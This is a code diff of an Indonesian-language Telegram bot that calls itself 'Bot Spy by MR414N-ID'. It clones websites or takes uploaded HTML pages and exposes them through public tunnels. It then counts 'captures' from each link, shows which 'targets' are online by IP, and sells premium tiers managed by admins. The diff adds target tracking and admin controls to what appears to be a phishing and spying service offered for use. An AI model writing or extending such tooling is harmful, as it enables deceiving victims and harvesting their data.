-        await q.edit_message_text("Ketik URL yang mau di-clone:\n(contoh: https://google.com)")
+        await q.edit_message_text("Ketik URL yang mau di-clone:")
 
     elif d == "tmpl_html":
         _user_state[uid]="await_html"
-        await q.edit_message_text("Kirim file `.html` sekarang di chat ini.")
+        await q.edit_message_text("Kirim file `.html` sekarang.")
 
     elif d in ("tun_cf","tun_ng","tun_sv"):
-        raw=_user_data.get(uid,{}).get("raw_html","")
+        raw = _user_data.get(uid,{}).get("raw_html","")
         if not raw:
             await q.edit_message_text("❌ Template kosong.",reply_markup=kb_main(uid)); return
-        key=d.replace("tun_","")
-        await spawn_link(key,raw,uid,q)
+        await spawn_link(d.replace("tun_",""), raw, uid, q)
         _user_state[uid]=None; _user_data[uid]={}
 
+    # --- list link ---
     elif d == "list_links":
         user_links=[l for l in _links if str(l["owner"])==uid]
         if not user_links:
-            await q.edit_message_text("📋 Belum ada link aktif.",reply_markup=kb_main(uid))
+            await q.edit_message_text("📋 Belum ada link.",reply_markup=kb_main(uid))
         else:
-            teks="📋 *Daftar Link Aktif:*\n\n"
+            teks="📋 *Link Aktif:*\n\n"
             for lnk in user_links:
                 cap=_cap_counts.get(lnk["id"],0)
-                teks+=f"• Link #{lnk['id']} ({cap} capture)\n`{lnk['pub_url']}`\n\n"
+                teks+=f"• Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
             await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
 
+    # --- target online ---
+    elif d == "online_now":
+        now = time.time()
+        teks = "👁 *Target Online Sekarang:*\n\n"
+        found = False
+        for lnk in [l for l in _links if str(l["owner"])==uid]:
+            targets = _active_targets.get(lnk["id"],{})
+            online  = [ip for ip,ts in targets.items() if now-ts<15]
+            if online:
+                found = True
+                teks += f"Link #{lnk['id']}: {len(online)} target\n"
+        if not found:
+            teks += "Tidak ada target online."
+        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
+
+    # --- hapus link ---
     elif d == "del_link":
         user_links=[l for l in _links if str(l["owner"])==uid]
         if not user_links:
@@ -639,48 +824,135 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 _links.pop(i); _page_htmls.pop(lid,None); break
         await q.edit_message_text(f"✅ Link #{lid} dihapus.",reply_markup=kb_main(uid))
 
+    # --- admin panel ---
     elif d == "admin_panel":
         if role!="admin":
             await q.answer("❌ Bukan admin.",show_alert=True); return
         await q.edit_message_text("👑 *Panel Admin:*",parse_mode="Markdown",reply_markup=kb_admin())
 
-    elif d == "admin_users":
+    elif d == "a_stats":
+        if role!="admin": return
+        s=db_get_stats()
+        online=get_online_count()
+        teks =(f"📊 *Statistik Server:*\n\n"
+               f"👥 Total user: {s['total_users']}\n"
+               f"👑 Admin: {s['roles'].get('admin',0)}\n"
+               f"💎 Premium: {s['roles'].get('premium',0)}\n"
+               f"🆓 Free: {s['roles'].get('free',0)}\n"
+               f"🔗 Link aktif: {s['total_links']}\n"
+               f"📸 Total capture: {s['total_cap']}\n"
+               f"👁 Target online: {online}\n"
+               f"⏱ Uptime: {format_uptime()}")
+        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
+
+    elif d == "a_users":
         if role!="admin": return
         users=db_all_users()
         if not users:
             await q.edit_message_text("Belum ada user.",reply_markup=kb_admin()); return
         teks="👥 *Semua User:*\n\n"
-        for uid_u,udata in users.items():
-            r=udata.get("role","free")
+        for u_id,ud in users.items():
+            r=ud.get("role","free")
             badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
-            teks+=f"{badge} `{uid_u}` — {r} — {udata.get('cap_total',0)} cap\n"
+            exp=ud.get("premium_until","")
+            exp_str=f" (exp: {exp})" if exp and r=="premium" else ""
+            teks+=f"{badge} `{u_id}` — {ud.get('cap_total',0)} cap{exp_str}\n"
         await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
 
-    elif d == "admin_upgrade":
+    elif d == "a_alllinks":
         if role!="admin": return
-        _user_state[uid]="await_upgrade_id"
+        if not _links:
+            await q.edit_message_text("Belum ada link aktif.",reply_markup=kb_admin()); return
+        teks="🔗 *Semua Link Aktif:*\n\n"
+        for lnk in _links:
+            cap=_cap_counts.get(lnk["id"],0)
+            teks+=f"Link #{lnk['id']} | Owner: `{lnk['owner']}` | {cap} cap\n`{lnk['pub_url']}`\n\n"
+        await q.edit_message_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
+
+    elif d == "a_upgrade":
+        if role!="admin": return
+        _user_state[uid]="a_await_upgrade"
         await q.edit_message_text("Ketik ID user yang mau di-upgrade ke Premium:")
 
-    elif d == "admin_downgrade":
+    elif d == "a_downgrade":
         if role!="admin": return
-        _user_state[uid]="await_downgrade_id"
+        _user_state[uid]="a_await_downgrade"
         await q.edit_message_text("Ketik ID user yang mau di-downgrade ke Free:")
 
-    elif d == "stop":
+    elif d == "a_ban":
+        if role!="admin": return
+        _user_state[uid]="a_await_ban"
+        await q.edit_message_text("Ketik ID user yang mau di-ban:")
+
+    elif d == "a_unban":
+        if role!="admin": return
+        _user_state[uid]="a_await_unban"
+        await q.edit_message_text("Ketik ID user yang mau di-unban:")
+
+    elif d == "a_addadmin":
+        if role!="admin": return
+        _user_state[uid]="a_await_addadmin"
+        await q.edit_message_text("Ketik ID user yang mau dijadikan Admin:")
+
+    elif d == "a_deladmin":
+        if role!="admin": return
+        _user_state[uid]="a_await_deladmin"
+        await q.edit_message_text("Ketik ID admin yang mau dicopot:")
+
+    elif d == "a_forcelink":
+        if role!="admin": return
+        _user_state[uid]="a_await_forcelink"
+        await q.edit_message_text("Ketik nomor Link ID yang mau dihapus:")
+
+    elif d == "a_msg":
+        if role!="admin": return
+        _user_state[uid]="a_await_msg_id"
+        await q.edit_message_text("Ketik ID user yang mau dikirim pesan:")
+
+    elif d == "a_broadcast":
+        if role!="admin": return
+        _user_state[uid]="a_await_broadcast"
+        await q.edit_message_text("Ketik pesan broadcast (akan dikirim ke semua user):")
+
+    elif d == "a_setexp":
+        if role!="admin": return
+        _user_state[uid]="a_await_exp_id"
+        await q.edit_message_text("Ketik ID user untuk set expired premium:")
+
+    elif d == "a_detail":
+        if role!="admin": return
+        _user_state[uid]="a_await_detail"
+        await q.edit_message_text("Ketik ID user yang mau dilihat detailnya:")
+
+    elif d == "a_stop":
+        if role!="admin": return
         await q.edit_message_text("🛑 *Server dihentikan.*",parse_mode="Markdown")
         await asyncio.sleep(1)
         global _timer_running; _timer_running=False
         os.kill(os.getpid(),signal.SIGINT)
 
+# ------------------------------------------------------------------ #
+#  MESSAGE HANDLER
+# ------------------------------------------------------------------ #
 async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid   = str(update.effective_user.id)
     state = _user_state.get(uid)
     text  = update.message.text.strip() if update.message.text else ""
 
+    # pesan biasa yang bukan command dan bukan dalam state apapun
+    if not state:
+        await update.message.reply_text(
+            "👋 Halo! Ini adalah *Bot Spy by MR414N-ID*\n\n"
+            "Bot ini hanya dapat digunakan oleh member terdaftar.\n\n"
+            "👉👉 /start 👈👈 tekan ini untuk memulai.",
+            parse_mode="Markdown"
+        )
+        return
+
     if state == "await_url":
         url = text
         if not url.startswith("http"): url="https://"+url
-        await update.message.reply_text(f"⏳ Cloning {url} ...")
+        await update.message.reply_text(f"⏳ Cloning {url}...")
         try:
             raw=clone_url(url)
             _user_data[uid]["raw_html"]=raw
@@ -689,24 +961,125 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_template())
 
-    elif state == "await_upgrade_id":
-        target=text.strip()
-        data=db_read()
-        if target not in data["users"]:
-            await update.message.reply_text(f"❌ ID `{target}` tidak ditemukan.",parse_mode="Markdown")
-        else:
-            db_upgrade_user(target)
-            await update.message.reply_text(f"✅ User `{target}` diupgrade ke *Premium*.",parse_mode="Markdown")
+    # --- admin states ---
+    elif state == "a_await_upgrade":
+        db_set_role(text,"premium")
+        await update.message.reply_text(f"✅ `{text}` diupgrade ke Premium.",
+                                        parse_mode="Markdown",reply_markup=kb_admin())
         _user_state[uid]=None
 
-    elif state == "await_downgrade_id":
-        target=text.strip()
+    elif state == "a_await_downgrade":
+        db_set_role(text,"free")
+        await update.message.reply_text(f"✅ `{text}` di-downgrade ke Free.",
+                                        parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_ban":
+        db_ban(text)
+        await update.message.reply_text(f"🚫 `{text}` dibanned.",
+                                        parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_unban":
+        db_unban(text)
+        await update.message.reply_text(f"✅ `{text}` di-unban.",
+                                        parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_addadmin":
+        db_add_admin(text)
+        await update.message.reply_text(f"✅ `{text}` dijadikan Admin.",
+                                        parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_deladmin":
+        ok=db_remove_admin(text)
+        msg=f"✅ `{text}` dicopot dari Admin." if ok else "❌ Tidak bisa hapus admin utama."
+        await update.message.reply_text(msg,parse_mode="Markdown",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_forcelink":
+        try:
+            lid=int(text)
+            for i,lnk in enumerate(_links):
+                if lnk["id"]==lid:
+                    if lnk.get("proc"):
+                        try: lnk["proc"].terminate()
+                        except: pass
+                    _links.pop(i); _page_htmls.pop(lid,None); break
+            await update.message.reply_text(f"✅ Link #{lid} dihapus paksa.",reply_markup=kb_admin())
+        except:
+            await update.message.reply_text("❌ ID tidak valid.",reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_msg_id":
+        _user_data[uid]["msg_target"]=text
+        _user_state[uid]="a_await_msg_text"
+        await update.message.reply_text(f"Ketik pesan untuk user `{text}`:",parse_mode="Markdown")
+
+    elif state == "a_await_msg_text":
+        target=_user_data[uid].get("msg_target","")
+        try:
+            bot=Bot(token=BOT_TOKEN)
+            await bot.send_message(chat_id=target,
+                                   text=f"📩 *Pesan dari Admin:*\n\n{text}",
+                                   parse_mode="Markdown")
+            await update.message.reply_text("✅ Pesan terkirim.",reply_markup=kb_admin())
+        except Exception as e:
+            await update.message.reply_text(f"❌ Gagal: {e}",reply_markup=kb_admin())
+        _user_state[uid]=None; _user_data[uid]={}
+
+    elif state == "a_await_broadcast":
+        users=db_all_users()
+        bot=Bot(token=BOT_TOKEN)
+        ok=0; fail=0
+        for u_id in users:
+            try:
+                await bot.send_message(chat_id=u_id,
+                                       text=f"📢 *Broadcast:*\n\n{text}",
+                                       parse_mode="Markdown")
+                ok+=1
+            except: fail+=1
+        await update.message.reply_text(f"📢 Broadcast selesai.\n✅ {ok} berhasil | ❌ {fail} gagal",
+                                        reply_markup=kb_admin())
+        _user_state[uid]=None
+
+    elif state == "a_await_exp_id":
+        _user_data[uid]["exp_target"]=text
+        _user_state[uid]="a_await_exp_date"
+        await update.message.reply_text(f"Ketik tanggal expired untuk `{text}` (format: YYYY-MM-DD):",
+                                        parse_mode="Markdown")
+
+    elif state == "a_await_exp_date":
+        target=_user_data[uid].get("exp_target","")
+        try:
+            datetime.datetime.strptime(text,"%Y-%m-%d")
+            db_set_role(target,"premium",until=text)
+            await update.message.reply_text(f"✅ Premium `{target}` berlaku sampai `{text}`.",
+                                            parse_mode="Markdown",reply_markup=kb_admin())
+        except:
+            await update.message.reply_text("❌ Format tanggal salah. Pakai YYYY-MM-DD.",
+                                            reply_markup=kb_admin())
+        _user_state[uid]=None; _user_data[uid]={}
+
+    elif state == "a_await_detail":
         data=db_read()
-        if target not in data["users"]:
-            await update.message.reply_text(f"❌ ID `{target}` tidak ditemukan.",parse_mode="Markdown")
+        ud=data["users"].get(text)
+        if not ud:
+            await update.message.reply_text(f"❌ User `{text}` tidak ditemukan.",
+                                            parse_mode="Markdown",reply_markup=kb_admin())
         else:
-            db_downgrade_user(target)
-            await update.message.reply_text(f"✅ User `{target}` di-downgrade ke *Free*.",parse_mode="Markdown")
+            r=ud.get("role","free")
+            badge={"admin":"👑","premium":"💎","free":"🆓"}.get(r,"🆓")
+            user_links=[l for l in _links if str(l["owner"])==text]
+            teks=(f"📝 *Detail User:*\n\n"
+                  f"ID: `{text}`\n"
+                  f"Role: {badge} {r}\n"
+                  f"Join: {ud.get('joined','?')}\n"
+                  f"Total capture: {ud.get('cap_total',0)}\n"
+                  f"Premium s/d: {ud.get('premium_until','∞')}\n"
+                  f"Link aktif: {len(user_links)}")
+            await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_admin())
         _user_state[uid]=None
 
 async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -718,8 +1091,8 @@ async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Harus file .html"); return
     await update.message.reply_text("⏳ Memproses file...")
     try:
-        tfile=await context.bot.get_file(doc.file_id)
-        raw=( await tfile.download_as_bytearray() ).decode("utf-8",errors="replace")
+        tfile = await context.bot.get_file(doc.file_id)
+        raw   = (await tfile.download_as_bytearray()).decode("utf-8",errors="replace")
         _user_data[uid]["raw_html"]=raw
         _user_state[uid]="await_tunnel"
         await update.message.reply_text("✅ File diterima!\n\nPilih tunnel:",reply_markup=kb_tunnel())
@@ -734,12 +1107,12 @@ def main():
     threading.Thread(target=timer_thread,daemon=True).start()
     print(f"\n\n  Buka @Spyjsbot → /start\n")
 
-    application=Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start",cmd_start))
-    application.add_handler(CallbackQueryHandler(on_button))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,on_message))
-    application.add_handler(MessageHandler(filters.Document.ALL,on_document))
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CallbackQueryHandler(on_button))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
-if __name__=="__main__":
+if __name__ == "__main__":
     main()
